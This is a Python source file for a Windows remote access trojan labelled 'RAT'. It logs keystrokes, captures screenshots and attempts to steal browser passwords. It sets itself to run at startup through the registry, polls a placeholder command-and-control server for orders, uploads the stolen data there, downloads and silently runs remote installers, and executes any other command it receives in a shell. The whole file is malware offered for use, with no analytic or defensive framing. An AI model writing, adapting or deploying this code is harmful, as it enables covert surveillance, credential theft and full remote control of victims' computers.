import os
import sys
import time
import requests
import subprocess
import threading
from pynput import keyboard
from cryptography.fernet import Fernet
import pyautogui
import json
import sqlite3
import shutil
import winreg

# Configuration
C2_SERVER = "http://your_c2_server_ip:5000"
CLIENT_ID = "unique_client_id"
KEY = Fernet.generate_key()
cipher_suite = Fernet(KEY)

# Keylogger
def keylogger():
    def on_press(key):
        try:
            with open("keylog.txt", "a") as f:
                f.write(f"{key.char}")
        except AttributeError:
            with open("keylog.txt", "a") as f:
                f.write(f" {key} ")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Screenshot Capture
def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    return "screenshot.png"

# Browser Password Extraction
def get_browser_passwords():
    try:
        from browser_password_stealer import steal_passwords  # Hypothetical module
        passwords = steal_passwords()
        with open("passwords.txt", "w") as f:
            json.dump(passwords, f)
        return "passwords.txt"
    except Exception as e:
        return f"Error: {str(e)}"

# Install App
def install_app(url):
    try:
        app_name = url.split("/")[-1]
        subprocess.run(["curl", "-o", app_name, url], check=True)
        subprocess.run([app_name, "/S"], check=True)
        return f"Installed {app_name}"
    except Exception as e:
        return f"Error: {str(e)}"

# Persistence (Automatic Startup)
def add_to_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "RAT", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(key)
        return "Added to startup"
    except Exception as e:
        return f"Error: {str(e)}"

# Send Data to C2
def send_data(data_type, data):
    try:
        with open(data, "rb") as f:
            encrypted_data = cipher_suite.encrypt(f.read())
        requests.post(f"{C2_SERVER}/upload", files={"file": encrypted_data}, data={"client_id": CLIENT_ID, "type": data_type})
    except Exception as e:
        print(f"Error sending data: {str(e)}")

# Poll Commands from C2
def poll_commands():
    while True:
        try:
            response = requests.post(f"{C2_SERVER}/command", json={"client_id": CLIENT_ID})
            if response.status_code == 200:
                command = response.json().get("command")
                if command:
                    execute_command(command)
        except Exception as e:
            print(f"Error polling commands: {str(e)}")
        time.sleep(10)

# Execute Commands
def execute_command(command):
    if command == "screenshot":
        screenshot_file = take_screenshot()
        send_data("screenshot", screenshot_file)
    elif command == "get_passwords":
        password_file = get_browser_passwords()
        send_data("passwords", password_file)
    elif command.startswith("install"):
        url = command.split(" ")[1]
        result = install_app(url)
        send_data("log", result)
    else:
        subprocess.run(command, shell=True)

# Main Function
def main():
    add_to_startup()
    threading.Thread(target=keylogger).start()
    threading.Thread(target=poll_commands).start()

if __name__ == "__main__":
    main()